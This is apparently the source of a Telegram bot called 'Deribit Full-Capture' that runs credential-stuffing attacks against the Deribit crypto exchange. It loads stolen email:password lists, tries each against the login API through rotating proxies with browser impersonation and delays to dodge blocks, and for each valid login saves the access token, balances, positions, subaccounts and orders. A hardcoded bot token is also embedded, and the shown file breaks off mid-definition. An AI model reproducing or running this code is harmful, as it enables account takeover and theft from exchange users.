import asyncio
import re
import json
import time
import random
import socket
import html as _html
from contextlib import asynccontextmanager
from pathlib import Path
from curl_cffi.requests import AsyncSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatAction
from telegram.error import BadRequest as TGBadRequest, NetworkError as TGNetworkError
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)

# ---------- config ----------
BOT_TOKEN = "8979502036:AAH8QN07Gj_MHOt83bsaaeIv174MbyqVQQg"

DERIBIT_BASE = "https://www.deribit.com"
# test: https://test.deribit.com
API = f"{DERIBIT_BASE}/api/v2"
AUTH_URL = f"{API}/public/auth"
SUMMARY_URL = f"{API}/private/get_account_summary"
POSITIONS_URL = f"{API}/private/get_positions"
SUBACCOUNTS_URL = f"{API}/private/get_subaccounts"
OPEN_ORDERS_URL = f"{API}/private/get_open_orders_by_currency"
TIME_URL = f"{API}/public/get_time"

SUMMARY_CURRENCIES = ["BTC", "ETH", "USDC"]

DEFAULT_THREADS = 2
CONNECT_TIMEOUT = 15
READ_TIMEOUT = 30
MIN_DELAY = 0.6
MAX_DELAY = 1.5
EDIT_EVERY = 3

IP_ERROR_CODES = {"RATE_LIMIT", "BLOCKED_IP", "TIMEOUT_OR_PROXY", "PROXY_ERROR"}
ACCOUNT_DEAD_CODES = {"BLOCKED", "LOCKED", "2FA_REQUIRED", "BAD_CREDS", "BAD_USERNAME"}
MAX_RETRIES_PER_COMBO = 3
RETRY_BACKOFF_BASE = 2.0
ROTATION_COOLDOWN = 15

MAX_CONCURRENT_HANDLERS = 64
MAX_CONCURRENT_RUNS = 8
HANDLER_TIMEOUT = 1800
API_CALL_TIMEOUT = 45
TYPING_INTERVAL = 4
BUBBLE_MIN_LIFETIME = 0.6

CHECK_TCP_TIMEOUT = 1.5
CHECK_HTTP_TIMEOUT = 8
CHECK_CONCURRENCY = 400
CHECK_CHUNK = 800
CHECK_PROGRESS_EVERY = 1.0

RUNNING: set[int] = set()
CHECKING: set[int] = set()
THREADS_PER_USER: dict[int, int] = {}
USE_PROXY: dict[int, bool] = {}
AWAIT_MODE: dict[int, str | None] = {}
SCREEN: dict[int, str] = {}

PROXY_CACHE: dict[int, list[dict]] = {}
BENCHED_PROXIES: dict[int, dict[str, float]] = {}
CLIENT_CACHE: dict[str, AsyncSession] = {}
CLIENT_LOCK = asyncio.Lock()

valid_lock = asyncio.Lock()
invalid_lock = asyncio.Lock()

HANDLER_SEM = asyncio.Semaphore(MAX_CONCURRENT_HANDLERS)
RUN_SEM = asyncio.Semaphore(MAX_CONCURRENT_RUNS)

URL_RE = re.compile(r"(?:https?|socks[45]h?)://([^/\s:]+):(\d+)")
HOST_PORT_RE = re.compile(r"^(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})$")


def esc(s) -> str:
    return _html.escape(str(s), quote=False)


def _rpc_method(url: str) -> str:
    if "/api/v2/" in url:
        return url.split("/api/v2/", 1)[-1]
    return url.rsplit("/", 1)[-1]


# ---------- telegram helpers ----------
async def _safe_answer(q):
    try:
        await q.answer()
    except Exception:
        pass


async def _safe_edit(msg, text, parse_mode=None, reply_markup=None, retries=3, backoff=1.2):
    for attempt in range(retries):
        try:
            await msg.edit_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
            return True
        except TGBadRequest as e:
            if "not modified" in str(e).lower():
                return True
            print(f"[edit] bad request: {e}")
            return False
        except TGNetworkError as e:
            if attempt < retries - 1:
                await asyncio.sleep(backoff * (attempt + 1))
                continue
            print(f"[edit] network err: {e}")
            return False
        except Exception as e:
            print(f"[edit] {type(e).__name__}: {e}")
            return False
    return False


async def _safe_reply(msg, text, parse_mode=None, reply_markup=None, retries=3, backoff=1.2):
    for attempt in range(retries):
        try:
            return await msg.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
        except TGNetworkError as e:
            if attempt < retries - 1:
                await asyncio.sleep(backoff * (attempt + 1))
                continue
            print(f"[reply] network err: {e}")
            return None
        except Exception as e:
            print(f"[reply] {type(e).__name__}: {e}")
            return None
    return None


async def _safe_send_doc(msg, doc, caption=None):
    for attempt in range(3):
        try:
            return await msg.reply_document(document=doc, caption=caption)
        except TGNetworkError:
            if attempt < 2:
                await asyncio.sleep(1.2 * (attempt + 1))
                continue
            return None
        except Exception as e:
            print(f"[doc] {type(e).__name__}: {e}")
            return None
    return None


async def _safe_delete(msg):
    try:
        await msg.delete()
    except Exception:
        pass


async def _typing_loop(chat_id, ctx, stop_event: asyncio.Event):
    try:
        while not stop_event.is_set():
            try:
                await ctx.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
            except Exception:
                pass
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=TYPING_INTERVAL)
            except asyncio.TimeoutError:
                continue
    except asyncio.CancelledError:
        return


@asynccontextmanager
async def _bubble(target_msg, text="â³ <i>working...</i>", parse_mode="HTML"):
    started = time.monotonic()
    bubble = await _safe_reply(target_msg, text, parse_mode=parse_mode)
    state = {"edited": False}
    try:
        yield bubble, state
    finally:
        elapsed = time.monotonic() - started
        if elapsed < BUBBLE_MIN_LIFETIME:
            await asyncio.sleep(BUBBLE_MIN_LIFETIME - elapsed)
        if bubble is not None and not state["edited"]:
            await _safe_delete(bubble)


def _isolate(name: str):
    def deco(fn):
        async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
            acquired = False
            try:
                try:
                    await asyncio.wait_for(HANDLER_SEM.acquire(), timeout=3.0)
                    acquired = True
                except asyncio.TimeoutError:
                    msg = update.effective_message
                    if msg:
                        await _safe_reply(msg, "â³ bot busy â€” try again in a moment.")
                    return
                await asyncio.wait_for(fn(update, ctx), timeout=HANDLER_TIMEOUT)
            except asyncio.TimeoutError:
                msg = update.effective_message
                if msg:
                    await _safe_reply(msg, "âš ï¸ action timed out â€” try again.")
            except Exception as e:
                print(f"[handler:{name}] {type(e).__name__}: {e}")
                msg = update.effective_message
                if msg:
                    await _safe_reply(msg, f"âš ï¸ error: {esc(str(e)[:120])}")
            finally:
                if acquired:
                    HANDLER_SEM.release()
        return wrapper
    return deco


async def _on_error(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    err = ctx.error
    if isinstance(err, TGBadRequest) and "not modified" in str(err).lower():
        return
    if isinstance(err, TGNetworkError):
        print(f"[error] net blip (ignored): {err}")
        return
    if isinstance(err, asyncio.TimeoutError):
        print("[error] timeout (ignored)")
        return
    if "Query is too old" in str(err):
        return
    print(f"[error] {type(err).__name__}: {err}")


# ---------- paths ----------
def user_dir(uid: int) -> Path:
    d = Path("sessions") / str(uid)
    d.mkdir(parents=True, exist_ok=True)
    return d


def combos_file(uid: int) -> Path: return user_dir(uid) / "combos.txt"
def valids_file(uid: int) -> Path: return user_dir(uid) / "valids.txt"
def invalids_file(uid: int) -> Path: return user_dir(uid) / "invalids.txt"
def proxies_file(uid: int) -> Path: return user_dir(uid) / "proxies.txt"
def good_proxies_file(uid: int) -> Path: return user_dir(uid) / "good_proxies.txt"
def hits_file(uid: int) -> Path: return user_dir(uid) / "hits.txt"
def full_capture_file(uid: int) -> Path: return user_dir(uid) / "full_capture.jsonl"
def benched_file(uid: int) -> Path: return user_dir(uid) / "benched.json"


def profiles_dir(uid: int) -> Path:
    d = user_dir(uid) / "profiles"
    d.mkdir(parents=True, exist_ok=True)
    return d


def get_threads(uid: int) -> int:
    return THREADS_PER_USER.get(uid, DEFAULT_THREADS)


def file_count(p: Path) -> int:
    if not p.exists():
        return 0
    return sum(1 for _ in p.open("r", encoding="utf-8", errors="ignore"))


def load_combos(uid: int) -> list[str]:
    f = combos_file(uid)
    if not f.exists():
        return []
    return [ln.strip() for ln in f.open("r", encoding="utf-8", errors="ignore")
            if ln.strip() and ":" in ln]


def load_proxies(uid: int) -> list[str]:
    f = proxies_file(uid)
    if not f.exists():
        return []
    return [ln.strip() for ln in f.open("r", encoding="utf-8", errors="ignore")
            if ln.strip() and not ln.startswith("#")]


# ---------- proxy parsing ----------
def parse_proxy(line: str) -> dict | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    scheme = "socks5"
    if "://" in line:
        scheme, line = line.split("://", 1)
        scheme = scheme.lower()
        if scheme not in ("http", "https", "socks4", "socks5", "socks4h", "socks5h"):
            return None
    user = pw = None
    if "@" in line:
        creds, hostport = line.rsplit("@", 1)
        if ":" not in creds:
            return None
        user, pw = creds.split(":", 1)
        host, port = hostport.rsplit(":", 1)
    elif line.count(":") == 3:
        host, port, user, pw = line.split(":")
    elif line.count(":") == 1:
        host, port = line.split(":")
    else:
        return None
    try:
        port = int(port)
    except ValueError:
        return None
    return {"scheme": scheme, "host": host, "port": port, "user": user, "pw": pw}


def proxy_url(p: dict) -> str:
    creds = f"{p['user']}:{p['pw']}@" if p["user"] else ""
    return f"{p['scheme']}://{creds}{p['host']}:{p['port']}"


def proxy_display(p: dict) -> str:
    return proxy_url(p)


# ---------- proxy bench/rotation ----------
def bench_proxy(uid: int, proxy: dict | None, secs: int = ROTATION_COOLDOWN):
    if proxy is None:
        return
    BENCHED_PROXIES.setdefault(uid, {})[proxy_url(proxy)] = time.time() + secs


def proxy_is_benched(uid: int, proxy: dict | None) -> bool:
    if proxy is None:
        return False
    key = proxy_url(proxy)
    until = BENCHED_PROXIES.get(uid, {}).get(key)
    if until is None:
        return False
    if time.time() >= until:
        BENCHED_PROXIES[uid].pop(key, None)
        return False
    return True


def save_bench_state(uid: int):
    try:
        benched_file(uid).write_text(
            json.dumps(BENCHED_PROXIES.get(uid, {})), encoding="utf-8"
        )
    except Exception:
        pass


def load_bench_state(uid: int):
    try:
        p = benched_file(uid)
        if p.exists():
            BENCHED_PROXIES[uid] = json.loads(p.read_text(encoding="utf-8"))
    except Exception:
        BENCHED_PROXIES[uid] = {}


# ---------- proxy checker ----------
def _tcp_ping(host: str, port: int, timeout: float) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _classify_proxy_probe(status: int, body: str) -> tuple[bool, str]:
    low = (body or "").lower()
    if status == 0:
        return (False, "NO_RESPONSE")
    if status == 403:
        return (False, "BLOCKED_IP")
    if status == 429:
        return (False, "RATE_LIMIT")
    if status == 401:
        return (False, "AUTH_ERR")
    if status >= 500:
        return (False, f"HTTP_{status}")
    if status != 200:
        return (False, f"HTTP_{status}")
    if "captcha" in low or "cloudflare" in low or "just a moment" in low:
        return (False, "CHALLENGE")
    if '"result"' not in body and '"error"' not in body:
        return (False, "NOT_DERIBIT")
    return (True, "OK")


async def _probe_proxy(p: dict) -> tuple[bool, str, float]:
    started = time.monotonic()
    loop = asyncio.get_running_loop()
    alive = await loop.run_in_executor(
        None, _tcp_ping, p["host"], p["port"], CHECK_TCP_TIMEOUT
    )
    if not alive:
        return (False, "TCP_DEAD", (time.monotonic() - started) * 1000)
    try:
        async with AsyncSession(
            impersonate="chrome124",
            proxies={"http": proxy_url(p), "https": proxy_url(p)},
            timeout=(CHECK_HTTP_TIMEOUT, CHECK_HTTP_TIMEOUT),
            verify=False,
            allow_redirects=False,
        ) as c:
            payload = {
                "jsonrpc": "2.0",
                "id": int(time.time() * 1000) % 100000,
                "method": "public/get_time",
                "params": {},
            }
            r = await c.post(TIME_URL, json=payload,
                             headers={"Content-Type": "application/json"},
                             timeout=CHECK_HTTP_TIMEOUT)
            ok, reason = _classify_proxy_probe(r.status_code, r.text or "")
            return (ok, reason, (time.monotonic() - started) * 1000)
    except asyncio.TimeoutError:
        return (False, "TIMEOUT", (time.monotonic() - started) * 1000)
    except Exception as e:
        msg = str(e)[:60].lower()
        if "timeout" in msg or "timed out" in msg:
            return (False, "TIMEOUT", (time.monotonic() - started) * 1000)
        return (False, f"ERR:{msg[:40]}", (time.monotonic() - started) * 1000)


async def check_proxies_batch(raw_lines, on_progress=None):
    sem = asyncio.Semaphore(CHECK_CONCURRENCY)
    good: list[dict] = []
    stats: dict[str, int] = {}
    done = 0
    total = len(raw_lines)
    lock = asyncio.Lock()
    started = time.monotonic()
    last_report = 0.0

    async def one(line: str):
        nonlocal done, last_report
        p = parse_proxy(line)
        if not p:
            async with lock:
                done += 1
                stats["MALFORMED"] = stats.get("MALFORMED", 0) + 1
            return
        async with sem:
            ok, reason, latency = await _probe_proxy(p)
        async with lock:
            done += 1
            if ok:
                p["_latency_ms"] = int(latency)
                good.append(p)
                stats["OK"] = stats.get("OK", 0) + 1
            else:
                stats[reason] = stats.get(reason, 0) + 1

            now = time.monotonic()
            if on_progress and (done % 50 == 0 or done == total or now - last_report > CHECK_PROGRESS_EVERY):
                last_report = now
                rate = done / max(now - started, 0.01)
                try:
                    await on_progress(done, total, len(good), done - len(good), rate)
                except Exception:
                    pass

    for i in range(0, total, CHECK_CHUNK):
        chunk = raw_lines[i:i + CHECK_CHUNK]
        await asyncio.gather(*(one(ln) for ln in chunk))

    good.sort(key=lambda x: x.get("_latency_ms", 999999))
    return (good, stats)


# ---------- client cache ----------
async def get_client(proxy: dict | None) -> AsyncSession:
    key = proxy_url(proxy) if proxy else "DIRECT"
    async with CLIENT_LOCK:
        c = CLIENT_CACHE.get(key)
        if c is None:
            proxies = None
            if proxy:
                u = proxy_url(proxy)
                proxies = {"http": u, "https": u}
            c = AsyncSession(
                impersonate="chrome124",
                proxies=proxies,
                timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                verify=False,
                allow_redirects=True,
            )
            CLIENT_CACHE[key] = c
        return c


async def drop_client(proxy: dict | None):
    key = proxy_url(proxy) if proxy else "DIRECT"
    async with CLIENT_LOCK:
        old = CLIENT_CACHE.pop(key, None)
    if old:
        try:
            await old.close()
        except Exception:
            pass


async def close_all_clients():
    async with CLIENT_LOCK:
        for c in CLIENT_CACHE.values():
            try:
                await c.close()
            except Exception:
                pass
        CLIENT_CACHE.clear()


# ---------- Deribit API helpers ----------
def _rpc_id() -> int:
    return int(time.time() * 1000) % 1000000


async def _api_call(client, url: str, params: dict | None = None,
                    token: str | None = None) -> tuple[bool, dict | str, int]:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    payload = {
        "jsonrpc": "2.0",
        "id": _rpc_id(),
        "method": _rpc_method(url),
        "params": params or {},
    }
    try:
        r = await asyncio.wait_for(
            client.post(url, json=payload, headers=headers,
                        timeout=(CONNECT_TIMEOUT, READ_TIMEOUT)),
            timeout=API_CALL_TIMEOUT,
        )
        try:
            data = r.json()
        except Exception:
            return (False, f"NON_JSON (HTTP {r.status_code})", r.status_code)
        return (True, data, r.status_code)
    except asyncio.TimeoutError:
        return (False, "API_TIMEOUT", 0)
    except Exception as e:
        return (False, str(e)[:150], 0)


async def _auth_via_query(client, email: str, password: str) -> tuple[bool, dict | str, int]:
    """REST-style auth: params live in the URL query string, no JSON-RPC wrapper."""
    qs = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "session:mainaccount",
    }
    try:
        r = await asyncio.wait_for(
            client.post(
                AUTH_URL,
                params=qs,
                headers={"Content-Type": "application/json"},
                timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
            ),
            timeout=API_CALL_TIMEOUT,
        )
        try:
            data = r.json()
        except Exception:
            return (False, f"NON_JSON (HTTP {r.status_code})", r.status_code)
        return (True, data, r.status_code)
    except asyncio.TimeoutError:
        return (False, "API_TIMEOUT", 0)
    except Exception as e:
        return (False, str(e)[:150], 0)


# ---------- invalids classifier ----------
def classify_auth_error(err: dict | None, http_status: int, raw_body: str = "") -> tuple[str, str]:
    if err and isinstance(err, dict):
        code = err.get("code", 0)
        msg = (err.get("message") or "").strip()
        low = msg.lower()

        if code == 13004 or "invalid_credentials" in low:
            return ("BAD_CREDS", f"wrong email or password ({msg[:80]})")
        if code == 13005 or "invalid_grant" in low:
            return ("BAD_CREDS", f"invalid grant ({msg[:80]})")
        if code == 10028 or "too_many_requests" in low or "rate" in low:
            return ("RATE_LIMIT", f"rate limited ({msg[:80]})")
        if code == 13003 or "account_blocked" in low or "blocked" in low:
            return ("BLOCKED", f"account blocked ({msg[:80]})")
        if code == 13006 or "account_not_found" in low or "user not found" in low:
            return ("BAD_USERNAME", f"no such account ({msg[:80]})")
        if "tfa" in low or "two-factor" in low or "2fa" in low or "totp" in low:
            return ("2FA_REQUIRED", f"2FA on account ({msg[:80]})")
        if "locked" in low:
            return ("LOCKED", f"account locked ({msg[:80]})")
        if "wrong_password" in low or "wrong password" in low:
            return ("BAD_CREDS", "wrong password")
        if code == 10000 or "authorization_required" in low:
            return ("AUTH_REQUIRED", f"auth required ({msg[:80]})")
        if code == 13009 or "forbidden" in low:
            return ("FORBIDDEN", f"forbidden ({msg[:80]})")
        if code == -32602 or "invalid params" in low:
            return ("BAD_PARAMS", f"invalid params ({msg[:80]})")
        if code == 11050 or "bad_request" in low:
            return ("BAD_REQUEST", f"deribit rejected request shape ({msg[:80]})")
        return (f"ERR_{code}", msg[:120] or "unknown error")

    if http_status == 429:
        return ("RATE_LIMIT", "HTTP 429")
    if http_status == 403:
        return ("BLOCKED_IP", "HTTP 403 â€” IP blocked by Deribit")
    if http_status == 401:
        return ("BAD_CREDS", "HTTP 401")
    if http_status == 0:
        return ("TIMEOUT_OR_PROXY", "no HTTP response (timeout/proxy)")
    if http_status >= 500:
        return ("SERVER_ERROR", f"HTTP {http_status}")
    if raw_body and "captcha" in raw_body.lower():
        return ("CAPTCHA", "captcha challenge")
    return (f"HTTP_{http_status}", "unclassified")


# ---------- full capture ----------
async def capture_full_account(client, token: str, uid: int, email: str) -> dict:
    profile = {
        "email": email,
        "captured_at": int(time.time()),
        "access_token": token,
        "summaries": {},
        "balances": {},
        "positions": {},
        "subaccounts": None,
        "open_orders": {},
        "errors": {},
    }

    for cur in SUMMARY_CURRENCIES:
        ok, data, status = await _api_call(
            client, SUMMARY_URL,
            {"currency": cur, "extended": True},
            token=token,
        )
        if ok and isinstance(data, dict) and "result" in data:
            res = data["result"]
            profile["summaries"][cur] = res
            profile["balances"][cur] = {
                "equity": res.get("equity"),
                "balance": res.get("balance"),
                "available_funds": res.get("available_funds"),
                "margin_balance": res.get("margin_balance"),
                "initial_margin": res.get("initial_margin"),
                "maintenance_margin": res.get("maintenance_margin"),
                "unrealized_pl": res.get("unrealized_pl"),
                "realized_pl": res.get("realized_pl"),
                "total_pl": res.get("total_pl"),
                "delta_total": res.get("delta_total"),
                "options_value": res.get("options_value"),
                "options_pl": res.get("options_pl"),
                "projected_delta_total": res.get("projected_delta_total"),
                "currency": cur,
            }
        else:
            err = data.get("error") if isinstance(data, dict) else data
            profile["errors"][f"summary_{cur}"] = err

    for cur in SUMMARY_CURRENCIES:
        ok, data, status = await _api_call(
            client, POSITIONS_URL, {"currency": cur}, token=token,
        )
        if ok and isinstance(data, dict) and "result" in data:
            pos = data["result"]
            if pos:
                profile["positions"][cur] = pos
        else:
            err = data.get("error") if isinstance(data, dict) else data
            profile["errors"][f"positions_{cur}"] = err

    ok, data, status = await _api_call(client, SUBACCOUNTS_URL, {"with_portfolio": True}, token=token)
    if ok and isinstance(data, dict) and "result" in data:
        profile["subaccounts"] = data["result"]
    else:
        err = data.get("error") if isinstance(data, dict) else data
        profile["errors"]["subaccounts"] = err

    for cur in SUMMARY_CURRENCIES:
        ok, data, status = await _api_call(
            client, OPEN_ORDERS_URL, {"currency": cur}, token=token,
        )
        if ok and isinstance(data, dict) and "result" in data:
            orders = data["result"]
            if orders:
                profile["open_orders"][cur] = orders
        else:
            err = data.get("error") if isinstance(data, dict) else data
            profile["errors"][f"orders_{cur}"] = err

    return profile


def build_hit_summary(profile: dict) -> str:
    parts = []
    for cur, b in profile.get("balances", {}).items():
        eq = b.get("equity")
        if eq is None:
            continue
        try:
            eq_f = float(eq)
        except (TypeError, ValueError):
            continue
        if eq_f == 0:
            continue
        parts.append(f"{cur}={eq_f:.8f}")
    if not parts:
        parts.append("empty_balances")

    n_orders = sum(len(v) for v in profile.get("open_orders", {}).values())
    n_pos = sum(len(v) for v in profile.get("positions", {}).values())
    subs = profile.get("subaccounts")
    n_subs = len(subs) if isinstance(subs, list) else 0

    extras = []
    if n_orders: extras.append(f"orders={n_orders}")
    if n_pos: extras.append(f"pos={n_pos}")
    if n_subs: extras.append(f"subs={n_subs}")
    tail = " ".join(extras)
    return " ".join(parts) + (f" | {tail}" if tail else "")


def write_result(uid: int, combo: str, status: str, reason: str, profile: dict | None = None):
    if status == "VALID":
        with valids_file(uid).open("a", encoding="utf-8") as f:
            f.write(f"{combo}\n")
        if profile:
            summary = build_hit_summary(profile)
            with hits_file(uid).open("a", encoding="utf-8") as f:
                f.write(f"{combo} | {summary}\n")
            with full_capture_file(uid).open("a", encoding="utf-8") as f:
                f.write(json.dumps(profile) + "\n")
            try:
                safe = re.sub(r'[^a-zA-Z0-9._@-]', '_', profile["email"])
                (profiles_dir(uid) / f"{safe}.json").write_text(
                    json.dumps(profile, indent=2), encoding="utf-8"
                )
            except Exception:
                pass
    else:
        with invalids_file(uid).open("a", encoding="utf-8") as f:
            f.write(f"{combo} | {reason}\n")


# ---------- main auth + capture flow ----------
def _is_param_shape_error(data: dict) -> bool:
    """True when Deribit rejected the request shape, not the credentials."""
    err = data.get("error")
    if not isinstance(err, dict):
        return False
    code = err.get("code", 0)
    msg = (err.get("message") or "").lower()
    return (
        code in (-32602, 11050)
        or "invalid params" in msg
        or "bad_request" in msg
        or "bad request" in msg
    )


async def try_login_full(combo: str, proxy: dict | None, uid: int,
                         d_min: float, d_max: float) -> tuple[str, str, str, dict | None]:
    combo = combo.strip()
    if ":" not in combo:
        return (combo, "INVALID", "MALFORMED â€” missing colon", None)
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    if not email or not password:
        return (combo, "INVALID", "MALFORMED â€” empty user or pass", None)

    await asyncio.sleep(random.uniform(d_min, d_max))

    client = await get_client(proxy)

    # stage 1: JSON-RPC style auth
    auth_payload = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "session:mainaccount",
    }
    ok, data, status = await _api_call(client, AUTH_URL, auth_payload)

    if not ok:
        reason_code, reason_msg = classify_auth_error(None, status, str(data))
        await drop_client(proxy)
        return (combo, "INVALID", f"{reason_code} â€” {reason_msg}", None)

    if not isinstance(data, dict):
        return (combo, "INVALID", "BAD_RESPONSE â€” non-dict JSON", None)

    # stage 2: if JSON-RPC shape got rejected, retry as plain query-string REST
    if _is_param_shape_error(data):
        ok2, data2, status2 = await _auth_via_query(client, email, password)
        if ok2 and isinstance(data2, dict):
            data = data2
            status = status2
        # else: fall through â€” data still has the original error

    err = data.get("error")
    if err:
        reason_code, reason_msg = classify_auth_error(err, status)
        return (combo, "INVALID", f"{reason_code} â€” {reason_msg}", None)

    result = data.get("result")
    if not isinstance(result, dict):
        return (combo, "INVALID", "NO_RESULT â€” malformed auth response", None)

    token = result.get("access_token")
    if not token:
        return (combo, "INVALID", "NO_TOKEN â€” auth succeeded but no access_token", None)

    try:
        profile = await capture_full_account(client, token, uid, email)
    except Exception as e:
        profile = {
            "email": email,
            "captured_at": int(time.time()),
            "access_token": token,
            "capture_error": str(e)[:200],
            "balances": {},
        }
    return (combo, "VALID", "OK", profile)


# ---------- UI ----------
def proxy_tag(uid: int) -> str:
    m = USE_PROXY.get(uid, None)
    if m is False: return "OFF"
    if m is True: return "ON"
    return "AUTO"


def _main_screen(uid: int) -> tuple[str, InlineKeyboardMarkup]:
    combos = len(load_combos(uid))
    v = file_count(valids_file(uid))
    i = file_count(invalids_file(uid))
    state = "RUNNING" if uid in RUNNING else ("CHECKING" if uid in CHECKING else "idle")
    awaiting = AWAIT_MODE.get(uid)
    hint = "tap a button"
    if awaiting == "combos": hint = "ðŸ“¥ send combos.txt now"
    elif awaiting == "proxies": hint = "ðŸ“¥ send proxies.txt now"

    pool = PROXY_CACHE.get(uid, [])
    benched = sum(1 for p in pool if proxy_is_benched(uid, p)) if pool else 0
    live = (len(pool) - benched) if pool else 0

    text = (
        f"<b>Deribit Full-Capture v2.6</b>\n"
        f"<code>state: {esc(state)}</code>\n\n"
        f"ðŸ“ combos: <code>{combos}</code>\n"
        f"âœ… valids: <code>{v}</code>\n"
        f"âŒ invalids: <code>{i}</code>\n"
        f"ðŸŒ proxies: <code>{live}</code> live Â· <code>{benched}</code> benched ({esc(proxy_tag(uid))})\n"
        f"âš™ï¸ threads: <code>{get_threads(uid)}</code>\n\n"
        f"<i>on valid: summary + balances + positions + subaccounts + open orders</i>\n"
        f"<i>on IP error: auto-rotate + backoff + retry</i>\n"
        f"<i>{esc(hint)}</i>"
    )
    rows = [
        [
            InlineKeyboardButton("ðŸ“ Upload Combos", callback_data="menu:upload_combos"),
            InlineKeyboardButton("ðŸŒ Upload Proxies", callback_data="menu:upload_proxies"),
        ],
        [
            InlineKeyboardButton("ðŸ§ª Check Proxies", callback_data="menu:check_proxies"),
            InlineKeyboardButton("ðŸ“„ Good Proxies", callback_data="menu:good_proxies"),
        ],
        [
            InlineKeyboardButton("â–¶ï¸ START", callback_data="menu:start"),
            InlineKeyboardButton("â¹ STOP", callback_data="menu:stop"),
        ],
        [
            InlineKeyboardButton("âš™ï¸ 2", callback_data="menu:t2"),
            InlineKeyboardButton("âš™ï¸ 4", callback_data="menu:t4"),
            InlineKeyboardButton("âš™ï¸ 8", callback_data="menu:t8"),
        ],
        [
            InlineKeyboardButton(f"ðŸŒ Mode: {proxy_tag(uid)}", callback_data="menu:cycle_proxy"),
            InlineKeyboardButton("â™»ï¸ Unbench All", callback_data="menu:unbench"),
        ],
        [
            InlineKeyboardButton("ðŸ“„ Valids", callback_data="menu:valids"),
            InlineKeyboardButton("ðŸŽ¯ Hits", callback_data="menu:hits"),
            InlineKeyboardButton("ðŸ“„ Invalids", callback_data="menu:invalids"),
        ],
        [
            InlineKeyboardButton("ðŸ“¦ Full Capture", callback_data="menu:fullcap"),
            InlineKeyboardButton("ðŸ§¹ Clear", callback_data="menu:clear"),
            InlineKeyboardButton("ðŸ”„ Refresh", callback_data="menu:refresh"),
        ],
    ]
    return text, InlineKeyboardMarkup(rows)


async def show_main(update: Update, ctx: ContextTypes.DEFAULT_TYPE, edit: bool = False):
    uid = update.effective_user.id
    SCREEN[uid] = "main"
    text, kb = _main_screen(uid)
    if edit and update.callback_query:
        if await _safe_edit(update.callback_query.message, text, parse_mode="HTML", reply_markup=kb):
            return
    target = update.callback_query.message if update.callback_query else update.message
    await _safe_reply(target, text, parse_mode="HTML", reply_markup=kb)


@_isolate("start")
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    AWAIT_MODE[uid] = None
    load_bench_state(uid)
    await show_main(update, ctx, edit=False)


# ---------- proxy check flow ----------
async def _run_proxy_check_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    q = update.callback_query
    msg = q.message

    if uid in CHECKING:
        await _safe_reply(msg, "proxy check already running.")
        return

    raw = load_proxies(uid)
    if not raw:
        await _safe_reply(msg, "no proxies.txt â€” upload one first.")
        return

    CHECKING.add(uid)
    total = len(raw)

    status_msg = await _safe_reply(
        msg,
        f"ðŸ§ª checking {total} proxies...\n"
        f"stage 1: TCP pre-ping ({CHECK_TCP_TIMEOUT}s)\n"
        f"stage 2: Deribit probe ({CHECK_HTTP_TIMEOUT}s)\n"
        f"concurrency: {CHECK_CONCURRENCY}",
    )
    if status_msg is None:
        CHECKING.discard(uid)
        return

    stop_typing = asyncio.Event()
    typing_task = asyncio.create_task(_typing_loop(msg.chat_id, ctx, stop_typing))

    last_edit = [0.0]

    async def on_progress(done, tot, working, dead, rate):
        now = time.monotonic()
        if now - last_edit[0] < 1.2 and done != tot:
            return
        last_edit[0] = now
        eta = (tot - done) / max(rate, 0.01)
        await _safe_edit(
            status_msg,
            f"ðŸ§ª checking {done}/{tot}\n"
            f"âœ… working: <code>{working}</code>\n"
            f"âŒ dead: <code>{dead}</code>\n"
            f"âš¡ <code>{rate:.0f}/s</code>  Â·  ETA <code>{int(eta)}s</code>",
            parse_mode="HTML",
        )

    try:
        started = time.monotonic()
        good, stats = await check_proxies_batch(raw, on_progress=on_progress)
        elapsed = time.monotonic() - started
    finally:
        stop_typing.set()
        try:
            await asyncio.wait_for(typing_task, timeout=2.0)
        except Exception:
            typing_task.cancel()
        CHECKING.discard(uid)

    if good:
        good_proxies_file(uid).write_text(
            "\n".join(proxy_display(p) for p in good) + "\n", encoding="utf-8"
        )
    PROXY_CACHE[uid] = good
    BENCHED_PROXIES[uid] = {}
    save_bench_state(uid)

    by_scheme: dict[str, int] = {}
    for p in good:
        by_scheme[p["scheme"]] = by_scheme.get(p["scheme"], 0) + 1
    scheme_line = " ".join(f"{k}:{n}" for k, n in by_scheme.items()) or "â€”"

    top_reasons = sorted(
        [(k, v) for k, v in stats.items() if k != "OK"],
        key=lambda x: -x[1],
    )[:5]
    reasons_line = " Â· ".join(f"{k}:{v}" for k, v in top_reasons) or "â€”"

    avg_lat = 0
    if good:
        avg_lat = int(sum(p.get("_latency_ms", 0) for p in good) / len(good))

    await _safe_edit(
        status_msg,
        f"âœ… proxy check done\n\n"
        f"ðŸ“Š total: <code>{total}</code> in <code>{elapsed:.1f}s</code>\n"
        f"âœ… working: <code>{len(good)}</code>\n"
        f"âŒ dead: <code>{total - len(good)}</code>\n"
        f"âš¡ avg latency: <code>{avg_lat}ms</code>\n"
        f"â†³ <code>{esc(scheme_line)}</code>\n\n"
        f"<b>dead reasons:</b>\n<code>{esc(reasons_line)}</code>\n\n"
        f"good_proxies.txt saved Â· pool refreshed",
        parse_mode="HTML",
    )
    await show_main(update, ctx, edit=False)


@_isolate("check_proxies")
